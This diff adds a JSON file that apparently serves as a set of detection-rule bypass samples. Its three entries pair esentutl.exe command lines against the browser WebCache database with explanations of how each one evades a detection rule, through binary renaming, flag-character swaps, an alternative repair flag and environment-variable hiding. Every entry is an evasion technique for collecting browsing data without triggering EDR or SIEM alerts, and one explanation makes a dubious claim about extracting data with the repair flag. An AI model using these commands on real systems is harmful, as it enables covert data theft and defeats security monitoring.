@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\esentutl.exe C:\\Users\\Public\\not_esentutl.exe && C:\\Users\\Public\\not_esentutl.exe /r %LocalAppData%\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat /d",
+    "explanation": "The rule is bypassed by replacing the '-' character with a '/' for the flag. Esentutl accepts both forward slashes and dashes for arguments. Additionally, by copying and renaming the binary, the 'selection_img' criteria (Image|endswith or OriginalFileName) might be avoided depending on whether the EDR/SIEM successfully tracks the OriginalFileName metadata on the new file copy."
+  },
+  {
+    "output": "esentutl.exe /p \"$env:LocalAppData\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat\" /t C:\\Users\\Public\\out.dat",
+    "explanation": "The rule specifically looks for the recovery flag (-r). Using the repair flag (/p) or the integrity flag (/g) against the WebCache database allows an attacker to interact with and potentially extract data from the database without triggering the specific 'selection_flag' logic that searches for '-r'."
+  },
+  {
+    "output": "set \"flag=/r\" && esentutl.exe %flag% %LocalAppData%\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat",
+    "explanation": "By using environment variable expansion in a batch script or command line, the static string detection 'CommandLine|contains: -r' may fail if the SIEM does not perform de-obfuscation or variable expansion before evaluation."
+  }
+]
